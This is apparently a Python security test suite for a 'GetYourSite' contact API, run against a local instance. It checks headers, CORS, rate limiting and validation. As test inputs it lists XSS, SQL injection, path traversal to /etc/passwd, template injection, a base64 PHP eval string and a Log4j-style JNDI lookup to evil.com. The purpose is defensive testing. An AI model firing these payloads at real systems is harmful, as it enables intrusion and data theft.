#!/usr/bin/env python3
"""
Security Test Suite for GetYourSite Application
Comprehensive security testing focusing on API security, headers, CORS, middleware, and validation
"""

import requests
import json
import time
import sys
from datetime import datetime
import urllib.parse

class GetYourSiteSecurityTester:
    def __init__(self):
        self.base_url = "http://localhost:3000"
        self.api_url = f"{self.base_url}/api"
        self.test_results = []
        self.failed_tests = []
        self.security_issues = []
        
    def log_test(self, test_name, status, message="", details=None, severity="INFO"):
        """Log test results with security severity"""
        result = {
            "test": test_name,
            "status": status,
            "message": message,
            "timestamp": datetime.now().isoformat(),
            "details": details,
            "severity": severity
        }
        self.test_results.append(result)
        
        status_icon = "✅" if status == "PASS" else "❌" if status == "FAIL" else "⚠️"
        severity_icon = "🔴" if severity == "CRITICAL" else "🟡" if severity == "HIGH" else "🔵"
        
        print(f"{status_icon} {severity_icon} {test_name}: {message}")
        
        if status == "FAIL":
            self.failed_tests.append(test_name)
            if severity in ["CRITICAL", "HIGH"]:
                self.security_issues.append({
                    "test": test_name,
                    "severity": severity,
                    "message": message,
                    "details": details
                })
            if details:
                print(f"   Details: {details}")

    def test_api_contact_get_security_headers(self):
        """Test GET /api/contact for security headers"""
        try:
            response = requests.get(f"{self.api_url}/contact", timeout=10)
            
            required_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block',
                'Cache-Control': 'no-store',
                'X-Request-ID': None  # Should exist
            }
            
            missing_headers = []
            incorrect_headers = []
            
            for header, expected_value in required_headers.items():
                actual_value = response.headers.get(header)
                
                if actual_value is None:
                    missing_headers.append(header)
                elif expected_value is not None:
                    if isinstance(expected_value, list):
                        if actual_value not in expected_value:
                            incorrect_headers.append(f"{header}: got '{actual_value}', expected one of {expected_value}")
                    elif expected_value not in actual_value:
                        incorrect_headers.append(f"{header}: got '{actual_value}', expected '{expected_value}'")
            
            if not missing_headers and not incorrect_headers:
                self.log_test("API Security Headers", "PASS", "All required security headers present and correct", severity="INFO")
                return True
            else:
                issues = []
                if missing_headers:
                    issues.append(f"Missing: {', '.join(missing_headers)}")
                if incorrect_headers:
                    issues.append(f"Incorrect: {'; '.join(incorrect_headers)}")
                
                self.log_test("API Security Headers", "FAIL", "Security headers issues found", 
                            details="; ".join(issues), severity="HIGH")
                return False
                
        except requests.exceptions.RequestException as e:
            self.log_test("API Security Headers", "FAIL", f"Request failed: {str(e)}", severity="CRITICAL")
            return False

    def test_api_contact_post_xss_protection(self):
        """Test POST /api/contact with XSS payloads"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "{{7*7}}",  # Template injection
            "${7*7}",   # Expression injection
        ]
        
        all_protected = True
        
        for payload in xss_payloads:
            test_data = {
                "name": payload,
                "email": "test@example.com",
                "message": f"Test message with payload: {payload}",
                "subject": payload
            }
            
            try:
                response = requests.post(
                    f"{self.api_url}/contact",
                    json=test_data,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                # Check if payload was sanitized or rejected
                if response.status_code == 200:
                    data = response.json()
                    # Should be sanitized, not executed
                    if payload in str(data):
                        self.log_test("XSS Protection", "FAIL", f"Payload not sanitized: {payload[:50]}...", 
                                    severity="CRITICAL")
                        all_protected = False
                elif response.status_code == 400:
                    # Validation rejection is also acceptable
                    continue
                else:
                    self.log_test("XSS Protection", "FAIL", f"Unexpected response for payload: {response.status_code}", 
                                severity="HIGH")
                    all_protected = False
                    
            except requests.exceptions.RequestException as e:
                self.log_test("XSS Protection", "FAIL", f"Request failed for XSS test: {str(e)}", severity="HIGH")
                all_protected = False
        
        if all_protected:
            self.log_test("XSS Protection", "PASS", "All XSS payloads properly handled", severity="INFO")
        
        return all_protected

    def test_api_contact_post_injection_attacks(self):
        """Test POST /api/contact with various injection payloads"""
        injection_payloads = [
            "'; DROP TABLE users; --",  # SQL injection
            "1' OR '1'='1",
            "admin'/*",
            "../../../etc/passwd",  # Path traversal
            "{{config}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "eval(base64_decode('cGhwaW5mbygpOw=='))",  # PHP injection
        ]
        
        all_protected = True
        
        for payload in injection_payloads:
            test_data = {
                "name": payload,
                "email": "test@example.com", 
                "message": f"Injection test: {payload}",
                "subject": "Test"
            }
            
            try:
                response = requests.post(
                    f"{self.api_url}/contact",
                    json=test_data,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                # Should be rejected or sanitized
                if response.status_code == 200:
                    data = response.json()
                    # Check if dangerous payload was processed
                    if "success" in data and payload in str(data):
                        self.log_test("Injection Protection", "FAIL", f"Injection payload not filtered: {payload[:50]}...", 
                                    severity="CRITICAL")
                        all_protected = False
                elif response.status_code == 400:
                    # Validation rejection is good
                    continue
                    
            except requests.exceptions.RequestException as e:
                self.log_test("Injection Protection", "FAIL", f"Request failed for injection test: {str(e)}", 
                            severity="HIGH")
                all_protected = False
        
        if all_protected:
            self.log_test("Injection Protection", "PASS", "All injection payloads properly handled", severity="INFO")
        
        return all_protected

    def test_rate_limiting(self):
        """Test rate limiting functionality"""
        try:
            # Send multiple requests quickly to trigger rate limiting
            responses = []
            for i in range(12):  # More than the limit of 10
                test_data = {
                    "name": f"Test User {i}",
                    "email": f"test{i}@example.com",
                    "message": f"Rate limit test message {i}"
                }
                
                response = requests.post(
                    f"{self.api_url}/contact",
                    json=test_data,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                responses.append(response)
                time.sleep(0.1)  # Small delay
            
            # Check if rate limiting kicked in
            rate_limited = any(r.status_code == 429 for r in responses)
            
            if rate_limited:
                # Check rate limit headers
                rate_limited_response = next(r for r in responses if r.status_code == 429)
                headers = rate_limited_response.headers
                
                required_rate_headers = ['X-RateLimit-Limit', 'X-RateLimit-Remaining', 'Retry-After']
                missing_headers = [h for h in required_rate_headers if h not in headers]
                
                if not missing_headers:
                    self.log_test("Rate Limiting", "PASS", "Rate limiting working with proper headers", severity="INFO")
                    return True
                else:
                    self.log_test("Rate Limiting", "FAIL", f"Rate limiting active but missing headers: {missing_headers}", 
                                severity="MEDIUM")
                    return False
            else:
                self.log_test("Rate Limiting", "FAIL", "Rate limiting not triggered after 12 requests", 
                            severity="HIGH")
                return False
                
        except requests.exceptions.RequestException as e:
            self.log_test("Rate Limiting", "FAIL", f"Request failed during rate limit test: {str(e)}", 
                        severity="HIGH")
            return False

    def test_cors_configuration(self):
        """Test CORS configuration"""
        try:
            # Test preflight request
            headers = {
                'Origin': 'https://evil.com',
                'Access-Control-Request-Method': 'POST',
                'Access-Control-Request-Headers': 'Content-Type'
            }
            
            response = requests.options(f"{self.api_url}/contact", headers=headers, timeout=10)
            
            # Should reject unauthorized origins
            cors_origin = response.headers.get('Access-Control-Allow-Origin')
            
            if cors_origin == '*':
                self.log_test("CORS Configuration", "FAIL", "Dangerous wildcard CORS policy detected", 
                            severity="CRITICAL")
                return False
            elif cors_origin and 'getyoursite.fr' in cors_origin:
                self.log_test("CORS Configuration", "PASS", "CORS properly configured with specific origins", 
                            severity="INFO")
                return True
            else:
                # Test with authorized origin
                headers['Origin'] = 'https://getyoursite.fr'
                response2 = requests.options(f"{self.api_url}/contact", headers=headers, timeout=10)
                cors_origin2 = response2.headers.get('Access-Control-Allow-Origin')
                
                if cors_origin2 and 'getyoursite.fr' in cors_origin2:
                    self.log_test("CORS Configuration", "PASS", "CORS properly configured", severity="INFO")
                    return True
                else:
                    self.log_test("CORS Configuration", "FAIL", "CORS configuration issues", 
                                details=f"Origin header: {cors_origin2}", severity="HIGH")
                    return False
                
        except requests.exceptions.RequestException as e:
            self.log_test("CORS Configuration", "FAIL", f"CORS test failed: {str(e)}", severity="HIGH")
            return False

    def test_middleware_security_headers(self):
        """Test middleware security headers on main page"""
        try:
            response = requests.get(self.base_url, timeout=10)
            
            required_headers = {
                'Content-Security-Policy': 'default-src',
                'Strict-Transport-Security': 'max-age',
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['SAMEORIGIN', 'DENY'],
                'X-XSS-Protection': '1; mode=block',
                'Referrer-Policy': 'strict-origin',
                'X-Request-ID': None  # Should exist
            }
            
            missing_headers = []
            weak_headers = []
            
            for header, expected_content in required_headers.items():
                actual_value = response.headers.get(header)
                
                if actual_value is None:
                    missing_headers.append(header)
                elif expected_content is not None:
                    if isinstance(expected_content, list):
                        if actual_value not in expected_content:
                            weak_headers.append(f"{header}: {actual_value}")
                    elif expected_content not in actual_value:
                        weak_headers.append(f"{header}: {actual_value}")
            
            if not missing_headers and not weak_headers:
                self.log_test("Middleware Security Headers", "PASS", "All security headers properly configured", 
                            severity="INFO")
                return True
            else:
                issues = []
                if missing_headers:
                    issues.append(f"Missing: {', '.join(missing_headers)}")
                if weak_headers:
                    issues.append(f"Weak: {'; '.join(weak_headers)}")
                
                severity = "CRITICAL" if missing_headers else "HIGH"
                self.log_test("Middleware Security Headers", "FAIL", "Security headers issues", 
                            details="; ".join(issues), severity=severity)
                return False
                
        except requests.exceptions.RequestException as e:
            self.log_test("Middleware Security Headers", "FAIL", f"Request failed: {str(e)}", severity="CRITICAL")
            return False

    def test_input_validation_edge_cases(self):
        """Test input validation with edge cases"""
        test_cases = [
            # Oversized inputs
            {"name": "A" * 200, "email": "test@example.com", "message": "Test", "expected": 400},
            {"name": "Test", "email": "test@example.com", "message": "A" * 3000, "expected": 400},
            {"name": "Test", "email": "A" * 300 + "@example.com", "message": "Test", "expected": 400},
            
            # Invalid formats
            {"name": "Test123", "email": "test@example.com", "message": "Test", "expected": 400},  # Numbers in name
            {"name": "Test<>", "email": "test@example.com", "message": "Test", "expected": 400},  # Special chars
            {"name": "Test", "email": "not-an-email", "message": "Test", "expected": 400},
            
            # Empty/whitespace
            {"name": "   ", "email": "test@example.com", "message": "Test", "expected": 400},
            {"name": "Test", "email": "test@example.com", "message": "   ", "expected": 400},
            
            # Very short message
            {"name": "Test", "email": "test@example.com", "message": "Hi", "expected": 400},
        ]
        
        all_validated = True
        
        for i, test_case in enumerate(test_cases):
            expected_status = test_case.pop("expected")
            
            try:
                response = requests.post(
                    f"{self.api_url}/contact",
                    json=test_case,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                if response.status_code != expected_status:
                    self.log_test(f"Input Validation Case {i+1}", "FAIL", 
                                f"Expected {expected_status}, got {response.status_code}", 
                                details=str(test_case), severity="MEDIUM")
                    all_validated = False
                    
            except requests.exceptions.RequestException as e:
                self.log_test(f"Input Validation Case {i+1}", "FAIL", f"Request failed: {str(e)}", 
                            severity="MEDIUM")
                all_validated = False
        
        if all_validated:
            self.log_test("Input Validation", "PASS", "All validation edge cases handled correctly", 
                        severity="INFO")
        
        return all_validated

    def test_content_type_validation(self):
        """Test Content-Type validation"""
        test_data = {
            "name": "Test User",
            "email": "test@example.com",
            "message": "Test message"
        }
        
        # Test with wrong content type
        try:
            response = requests.post(
                f"{self.api_url}/contact",
                data=json.dumps(test_data),  # JSON data but wrong header
                headers={'Content-Type': 'text/plain'},
                timeout=10
            )
            
            if response.status_code == 400:
                data = response.json()
                if 'Content-Type' in data.get('error', ''):
                    self.log_test("Content-Type Validation", "PASS", "Content-Type validation working", 
                                severity="INFO")
                    return True
                else:
                    self.log_test("Content-Type Validation", "FAIL", "Wrong error message for Content-Type", 
                                details=data, severity="MEDIUM")
                    return False
            else:
                self.log_test("Content-Type Validation", "FAIL", 
                            f"Expected 400 for wrong Content-Type, got {response.status_code}", 
                            severity="MEDIUM")
                return False
                
        except requests.exceptions.RequestException as e:
            self.log_test("Content-Type Validation", "FAIL", f"Request failed: {str(e)}", severity="MEDIUM")
            return False

    def test_unauthorized_origins_blocking(self):
        """Test blocking of unauthorized origins"""
        unauthorized_origins = [
            'https://evil.com',
            'http://malicious-site.com',
            'https://phishing-site.net'
        ]
        
        all_blocked = True
        
        for origin in unauthorized_origins:
            test_data = {
                "name": "Test User",
                "email": "test@example.com",
                "message": "Test message"
            }
            
            try:
                response = requests.post(
                    f"{self.api_url}/contact",
                    json=test_data,
                    headers={
                        'Content-Type': 'application/json',
                        'Origin': origin
                    },
                    timeout=10
                )
                
                # Should be blocked (403) or have restricted CORS
                if response.status_code == 403:
                    continue  # Good, blocked
                elif response.status_code == 200:
                    # Check CORS headers
                    cors_origin = response.headers.get('Access-Control-Allow-Origin')
                    if cors_origin == '*' or origin in str(cors_origin):
                        self.log_test("Origin Blocking", "FAIL", f"Unauthorized origin not blocked: {origin}", 
                                    severity="HIGH")
                        all_blocked = False
                else:
                    # Other status codes might be acceptable
                    continue
                    
            except requests.exceptions.RequestException as e:
                self.log_test("Origin Blocking", "FAIL", f"Request failed for origin test: {str(e)}", 
                            severity="MEDIUM")
                all_blocked = False
        
        if all_blocked:
            self.log_test("Origin Blocking", "PASS", "Unauthorized origins properly blocked", severity="INFO")
        
        return all_blocked

    def run_security_tests(self):
        """Run all security tests"""
        print("🔒 Starting GetYourSite Security Tests")
        print("=" * 60)
        
        # API Security Tests
        print("\n📡 API Security Tests")
        print("-" * 30)
        self.test_api_contact_get_security_headers()
        self.test_content_type_validation()
        
        # Input Validation & Sanitization Tests  
        print("\n🛡️  Input Validation & Sanitization Tests")
        print("-" * 45)
        self.test_api_contact_post_xss_protection()
        self.test_api_contact_post_injection_attacks()
        self.test_input_validation_edge_cases()
        
        # Rate Limiting Tests
        print("\n⏱️  Rate Limiting Tests")
        print("-" * 25)
        self.test_rate_limiting()
        
        # CORS & Origin Tests
        print("\n🌐 CORS & Origin Security Tests")
        print("-" * 35)
        self.test_cors_configuration()
        self.test_unauthorized_origins_blocking()
        
        # Middleware Security Tests
        print("\n🔧 Middleware Security Tests")
        print("-" * 30)
        self.test_middleware_security_headers()
        
        # Security Summary
        print("\n" + "=" * 60)
        print("🔒 Security Test Summary")
        print("=" * 60)
        
        total_tests = len(self.test_results)
        passed_tests = len([t for t in self.test_results if t['status'] == 'PASS'])
        failed_tests = len([t for t in self.test_results if t['status'] == 'FAIL'])
        
        print(f"Total Security Tests: {total_tests}")
        print(f"✅ Passed: {passed_tests}")
        print(f"❌ Failed: {failed_tests}")
        
        # Security Issues Summary
        if self.security_issues:
            print(f"\n🚨 Security Issues Found: {len(self.security_issues)}")
            critical_issues = [i for i in self.security_issues if i['severity'] == 'CRITICAL']
            high_issues = [i for i in self.security_issues if i['severity'] == 'HIGH']
            
            if critical_issues:
                print(f"🔴 Critical: {len(critical_issues)}")
                for issue in critical_issues:
                    print(f"   - {issue['test']}: {issue['message']}")
            
            if high_issues:
                print(f"🟡 High: {len(high_issues)}")
                for issue in high_issues:
                    print(f"   - {issue['test']}: {issue['message']}")
        
        if failed_tests == 0:
            print("\n🎉 All security tests passed! Application is secure.")
            return True
        elif len(self.security_issues) == 0:
            print("\n✅ No critical security issues found. Minor issues detected.")
            return True
        else:
            print(f"\n❌ Security vulnerabilities detected. Review required.")
            return False

if __name__ == "__main__":
    tester = GetYourSiteSecurityTester()
    success = tester.run_security_tests()
    sys.exit(0 if success else 1)